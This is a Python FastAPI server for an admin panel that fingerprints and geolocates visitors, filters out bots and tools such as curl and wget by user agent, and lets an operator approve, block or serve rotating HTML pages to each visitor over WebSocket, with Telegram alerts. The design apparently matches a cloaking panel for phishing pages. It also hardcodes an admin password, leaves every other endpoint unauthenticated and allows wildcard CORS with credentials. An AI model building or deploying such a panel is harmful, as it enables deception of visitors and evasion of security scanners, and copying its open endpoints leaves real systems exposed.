from fastapi import FastAPI, APIRouter, WebSocket, WebSocketDisconnect, HTTPException, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os, logging, uuid, asyncio
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional, Dict
from datetime import datetime, timezone
import httpx
import re

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

mongo_url = os.environ.get('MONGO_URL', 'mongodb://localhost:27017')
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'admin_panel')]

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

api_router = APIRouter(prefix="/api")
logger = logging.getLogger(__name__)

# ── WebSocket Manager ────────────────────────────────────────────────────────
class ConnectionManager:
    def __init__(self):
        self.admin_connections: List[WebSocket] = []
        self.visitor_connections: Dict[str, List[WebSocket]] = {}

    async def connect_admin(self, ws: WebSocket):
        await ws.accept()
        self.admin_connections.append(ws)

    def disconnect_admin(self, ws: WebSocket):
        if ws in self.admin_connections:
            self.admin_connections.remove(ws)

    async def connect_visitor(self, session_id: str, ws: WebSocket):
        await ws.accept()
        if session_id not in self.visitor_connections:
            self.visitor_connections[session_id] = []
        self.visitor_connections[session_id].append(ws)

    def disconnect_visitor(self, session_id: str, ws: WebSocket):
        if session_id in self.visitor_connections:
            if ws in self.visitor_connections[session_id]:
                self.visitor_connections[session_id].remove(ws)
            if not self.visitor_connections[session_id]:
                self.visitor_connections.pop(session_id)

    async def broadcast_admins(self, data: dict):
        dead = []
        for ws in self.admin_connections:
            try:
                await ws.send_json(data)
            except Exception:
                dead.append(ws)
        for ws in dead:
            if ws in self.admin_connections:
                self.admin_connections.remove(ws)

    async def notify_visitor(self, session_id: str, data: dict):
        sockets = self.visitor_connections.get(session_id, [])
        dead = []
        for ws in sockets:
            try:
                await ws.send_json(data)
            except Exception:
                dead.append(ws)
        for ws in dead:
            self.disconnect_visitor(session_id, ws)

manager = ConnectionManager()

# ── Bot Detection ─────────────────────────────────────────────────────────────
BOT_PATTERNS = [
    'bot', 'crawler', 'spider', 'scraper', 'python-requests', 'python-urllib',
    'curl/', 'wget/', 'httpie/', 'go-http', 'java/', 'ruby', 'perl/',
    'scrapy', 'mechanize', 'selenium', 'phantomjs', 'headless',
    'postman', 'insomnia', 'httpclient', 'okhttp', 'libwww', 'node-fetch',
]

def detect_bot(user_agent: str) -> tuple:
    if not user_agent or len(user_agent) < 10:
        return True, 0.9
    ua_lower = user_agent.lower()
    for pattern in BOT_PATTERNS:
        if pattern in ua_lower:
            return True, 0.85
    return False, 0.0

# ── Geolocation ───────────────────────────────────────────────────────────────
async def get_geo(ip: str) -> dict:
    if ip in ('127.0.0.1', 'localhost', '::1', ''):
        return {'country': 'Localhost', 'city': 'Local', 'lat': 0.0, 'lng': 0.0, 'isp': 'Local'}
    try:
        async with httpx.AsyncClient(timeout=4.0) as c:
            r = await c.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp")
            d = r.json()
            if d.get('status') == 'success':
                return {
                    'country': d.get('country', ''),
                    'city': d.get('city', ''),
                    'lat': float(d.get('lat', 0)),
                    'lng': float(d.get('lon', 0)),
                    'isp': d.get('isp', '')
                }
    except Exception:
        pass
    return {'country': 'Unknown', 'city': 'Unknown', 'lat': 0.0, 'lng': 0.0, 'isp': 'Unknown'}

# ── Telegram ──────────────────────────────────────────────────────────────────
async def send_telegram(msg: str):
    token = os.environ.get('TELEGRAM_BOT_TOKEN', '')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID', '')
    if not token or not chat_id:
        return
    try:
        async with httpx.AsyncClient(timeout=10.0) as c:
            await c.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"}
            )
    except Exception as e:
        logger.warning(f"Telegram error: {e}")

# ── Helpers ───────────────────────────────────────────────────────────────────
def now_iso():
    return datetime.now(timezone.utc).isoformat()

async def create_alert(type_: str, msg: str, severity: str = "info"):
    alert = {
        "id": str(uuid.uuid4()),
        "type": type_,
        "message": msg,
        "severity": severity,
        "read": False,
        "created_at": now_iso()
    }
    await db.alerts.insert_one(alert)
    safe = {k: v for k, v in alert.items() if k != '_id'}
    await manager.broadcast_admins({"event": "new_alert", "alert": safe})
    return safe

# ── Pydantic Models ───────────────────────────────────────────────────────────
class AdminAuth(BaseModel):
    password: str

class VisitorRegister(BaseModel):
    session_id: str
    user_agent: str
    screen_width: Optional[int] = 0
    screen_height: Optional[int] = 0
    timezone: Optional[str] = ""
    languages: Optional[str] = ""

class VisitorAction(BaseModel):
    page_id: Optional[str] = None

class PageRotationRequest(BaseModel):
    page_ids: List[str]
    interval_ms: int = 5000

class PageCreate(BaseModel):
    name: str
    content: str
    is_default: bool = False

class PageUpdate(BaseModel):
    name: Optional[str] = None
    content: Optional[str] = None
    is_default: Optional[bool] = None

class TargetCreate(BaseModel):
    host: str
    description: str = ""
    ports: str = ""
    status: str = "active"

class ScanCreate(BaseModel):
    target_id: str
    scan_type: str
    results: str = ""
    notes: str = ""
    status: str = "pending"

class ScanUpdate(BaseModel):
    scan_type: Optional[str] = None
    results: Optional[str] = None
    notes: Optional[str] = None
    status: Optional[str] = None

class VulnCreate(BaseModel):
    target_id: str
    title: str
    severity: str = "medium"
    description: str = ""
    cvss: float = 0.0
    status: str = "open"

class AlertCreate(BaseModel):
    type: str
    message: str
    severity: str = "info"

# ── Auth ──────────────────────────────────────────────────────────────────────
@api_router.post("/auth/admin")
async def admin_login(body: AdminAuth):
    if body.password != 'University@007':
        raise HTTPException(status_code=401, detail="Invalid password")
    return {"success": True}

# ── Visitors ──────────────────────────────────────────────────────────────────
@api_router.post("/visitors/register")
async def register_visitor(body: VisitorRegister, request: Request):
    forwarded = request.headers.get("x-forwarded-for")
    ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host or "")

    existing = await db.visitors.find_one({"session_id": body.session_id}, {"_id": 0})
    if existing:
        await db.visitors.update_one({"session_id": body.session_id}, {"$set": {"last_seen": now_iso()}})
        return existing

    is_bot, bot_score = detect_bot(body.user_agent)
    geo = await get_geo(ip)

    visitor = {
        "id": str(uuid.uuid4()),
        "session_id": body.session_id,
        "ip": ip,
        "country": geo['country'],
        "city": geo['city'],
        "lat": geo['lat'],
        "lng": geo['lng'],
        "isp": geo['isp'],
        "user_agent": body.user_agent,
        "screen": f"{body.screen_width}x{body.screen_height}",
        "timezone": body.timezone,
        "languages": body.languages,
        "status": "pending",
        "page_id": None,
        "is_bot": is_bot,
        "bot_score": bot_score,
        "created_at": now_iso(),
        "last_seen": now_iso()
    }

    await db.visitors.insert_one({**visitor})
    await manager.broadcast_admins({"event": "new_visitor", "visitor": visitor})
    return visitor

@api_router.get("/visitors")
async def get_visitors():
    visitors = await db.visitors.find({}, {"_id": 0}).sort("created_at", -1).to_list(500)
    return visitors

@api_router.put("/visitors/{visitor_id}/approve")
async def approve_visitor(visitor_id: str, body: VisitorAction):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")

    update_data: dict = {"status": "approved", "is_rotating": False, "last_seen": now_iso()}
    if body.page_id:
        update_data["page_id"] = body.page_id

    await db.visitors.update_one({"id": visitor_id}, {"$set": update_data})

    page_content = None
    pid = body.page_id or visitor.get("page_id")
    if pid:
        page = await db.pages.find_one({"id": pid}, {"_id": 0})
    else:
        page = await db.pages.find_one({"is_default": True}, {"_id": 0})
    if page:
        page_content = page.get("content")

    await manager.notify_visitor(visitor["session_id"], {"event": "approved", "page_content": page_content})
    await manager.broadcast_admins({"event": "visitor_updated", "visitor_id": visitor_id, "status": "approved", "is_rotating": False})
    return {"success": True}

@api_router.put("/visitors/{visitor_id}/approve/rotate")
async def approve_visitor_with_rotation(visitor_id: str, body: PageRotationRequest):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not body.page_ids or len(body.page_ids) < 2 or len(body.page_ids) > 6:
        raise HTTPException(status_code=400, detail="Must provide 2-6 page IDs")
    
    for page_id in body.page_ids:
        page = await db.pages.find_one({"id": page_id}, {"_id": 0})
        if not page:
            raise HTTPException(status_code=404, detail=f"Page {page_id} not found")
    
    update_data = {
        "status": "approved",
        "last_seen": now_iso(),
        "rotation_pages": body.page_ids,
        "rotation_interval": body.interval_ms,
        "current_page_index": 0,
        "is_rotating": True
    }
    
    await db.visitors.update_one({"id": visitor_id}, {"$set": update_data})
    
    page = await db.pages.find_one({"id": body.page_ids[0]}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    await manager.notify_visitor(visitor["session_id"], {
        "event": "approved",
        "page_content": page_content,
        "rotation_mode": True,
        "page_ids": body.page_ids,
        "interval_ms": body.interval_ms,
        "current_page_index": 0
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "is_rotating": True
    })
    
    return {"success": True, "rotation_mode": True, "pages": len(body.page_ids)}

@api_router.put("/visitors/{visitor_id}/rotation/next")
async def rotate_to_next_page(visitor_id: str):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    if not visitor.get("is_rotating"):
        raise HTTPException(status_code=400, detail="Visitor is not in rotation mode")
    
    rotation_pages = visitor.get("rotation_pages", [])
    current_index = visitor.get("current_page_index", 0)
    next_index = (current_index + 1) % len(rotation_pages)
    
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {"current_page_index": next_index, "last_seen": now_iso()}}
    )
    
    next_page_id = rotation_pages[next_index]
    page = await db.pages.find_one({"id": next_page_id}, {"_id": 0})
    page_content = page.get("content") if page else None
    
    await manager.notify_visitor(visitor["session_id"], {
        "event": "rotate_page",
        "page_content": page_content,
        "page_index": next_index,
        "total_pages": len(rotation_pages)
    })
    
    return {"success": True, "page_index": next_index, "total_pages": len(rotation_pages)}

@api_router.put("/visitors/{visitor_id}/rotation/stop")
async def stop_page_rotation(visitor_id: str):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")
    
    await db.visitors.update_one(
        {"id": visitor_id},
        {"$set": {
            "is_rotating": False,
            "rotation_pages": None,
            "current_page_index": 0,
            "last_seen": now_iso()
        }}
    )
    
    await manager.notify_visitor(visitor["session_id"], {
        "event": "stop_rotation"
    })
    
    await manager.broadcast_admins({
        "event": "visitor_updated",
        "visitor_id": visitor_id,
        "status": "approved",
        "is_rotating": False
    })
    
    return {"success": True}

@api_router.put("/visitors/{visitor_id}/block")
async def block_visitor(visitor_id: str):
    visitor = await db.visitors.find_one({"id": visitor_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Visitor not found")

    await db.visitors.update_one({"id": visitor_id}, {"$set": {"status": "blocked", "is_rotating": False, "last_seen": now_iso()}})
    await manager.notify_visitor(visitor["session_id"], {"event": "blocked"})
    await manager.broadcast_admins({"event": "visitor_updated", "visitor_id": visitor_id, "status": "blocked", "is_rotating": False})
    return {"success": True}

@api_router.delete("/visitors/{visitor_id}")
async def delete_visitor(visitor_id: str):
    await db.visitors.delete_one({"id": visitor_id})
    await manager.broadcast_admins({"event": "visitor_deleted", "visitor_id": visitor_id})
    return {"success": True}

@api_router.get("/visitors/{session_id}/status")
async def get_visitor_status(session_id: str):
    visitor = await db.visitors.find_one({"session_id": session_id}, {"_id": 0})
    if not visitor:
        raise HTTPException(status_code=404, detail="Not found")
    
    result: dict = {
        "status": visitor["status"],
        "is_rotating": visitor.get("is_rotating", False)
    }
    
    if visitor["status"] == "approved":
        if visitor.get("is_rotating"):
            rotation_pages = visitor.get("rotation_pages", [])
            current_index = visitor.get("current_page_index", 0)
            if rotation_pages and current_index < len(rotation_pages):
                page_id = rotation_pages[current_index]
                page = await db.pages.find_one({"id": page_id}, {"_id": 0})
                if page:
                    result["page_content"] = page.get("content")
                    result["rotation_mode"] = True
                    result["interval_ms"] = visitor.get("rotation_interval", 5000)
        else:
            pid = visitor.get("page_id")
            page = await db.pages.find_one({"id": pid}, {"_id": 0}) if pid else await db.pages.find_one({"is_default": True}, {"_id": 0})
            if page:
                result["page_content"] = page.get("content")
    
    return result

@api_router.get("/pages")
async def get_pages():
    pages = await db.pages.find({}, {"_id": 0, "content": 0}).sort("created_at", -1).to_list(100)
    return pages

@api_router.post("/pages")
async def create_page(body: PageCreate):
    if body.is_default:
        await db.pages.update_many({}, {"$set": {"is_default": False}})
    page = {
        "id": str(uuid.uuid4()),
        "name": body.name,
        "content": body.content,
        "is_default": body.is_default,
        "created_at": now_iso(),
        "updated_at": now_iso()
    }
    await db.pages.insert_one(page)
    return {k: v for k, v in page.items() if k != '_id'}

@api_router.get("/stats")
async def get_stats():
    now_ts = datetime.now(timezone.utc).timestamp()
    online = await db.visitors.count_documents({"last_seen": {"$gt": datetime.fromtimestamp(now_ts - 300, timezone.utc).isoformat()}})
    pending = await db.visitors.count_documents({"status": "pending"})
    vulnerabilities = await db.vulnerabilities.count_documents({"status": "open"})
    unread_alerts = await db.alerts.count_documents({"read": False})
    
    return {
        "visitors": {"online": online, "pending": pending},
        "pentest": {"vulnerabilities": vulnerabilities},
        "alerts": {"unread": unread_alerts}
    }

@app.websocket("/api/ws/admin")
async def websocket_admin(ws: WebSocket):
    await manager.connect_admin(ws)
    try:
        while True:
            data = await ws.receive_text()
            if data == "ping":
                await ws.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect_admin(ws)

@app.websocket("/api/ws/visitor/{session_id}")
async def websocket_visitor(ws: WebSocket, session_id: str):
    await manager.connect_visitor(session_id, ws)
    try:
        while True:
            data = await ws.receive_text()
            if data == "ping":
                await ws.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect_visitor(session_id, ws)

app.include_router(api_router)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
